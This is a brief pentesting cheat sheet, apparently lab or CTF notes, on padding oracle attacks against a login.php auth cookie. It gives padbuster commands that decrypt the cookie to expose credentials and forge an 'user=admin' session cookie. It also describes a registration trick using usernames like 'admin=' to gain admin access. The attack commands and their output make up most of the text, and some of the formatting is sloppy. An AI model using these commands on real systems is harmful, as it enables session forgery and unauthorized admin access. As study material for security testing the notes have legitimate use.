# Padding Oracle Attack

```http
GET /login.php HTTP1.1

auth: abcd123
```

### Example attack

```bash
padbuster http://<ip>/login.php <cookie> 8 -cookie "<auth>=<cookie>" -encoding 0
```

```bash
padbuster http://10.10.10.18/login.php abcd123 8 -cookie "auth=abcd123" -encoding 0
```

If you get "plain text: <credentials>" it's vulnerable

```bash
...
...
plain text: user=guest123
```
 
Attack admin cookie session
 
 ```bash
padbuster http://10.10.10.18/login.php abcd123 8 -cookie "auth=abcd123" -encoding 0 -plaintext "user=admin"
``
  
### 2th Example Attack
  
Register
input=Username
input:Password
  
Username: admin= or Username: admin==
